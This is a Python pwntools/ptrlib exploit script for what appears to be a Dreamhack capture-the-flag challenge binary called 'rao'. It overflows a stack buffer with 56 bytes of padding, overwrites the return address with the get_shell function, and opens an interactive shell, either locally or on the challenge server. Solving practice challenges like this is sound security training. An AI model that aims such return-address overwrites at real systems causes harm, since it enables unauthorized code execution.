#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./rao")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 10291)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    get_shell = unwrap(exe.symbol("get_shell"))

    payload = b"A" * 56
    payload += ptr.p64(get_shell)

    io.sendline(payload)
    io.interactive()
    return


if __name__ == "__main__":
    main()
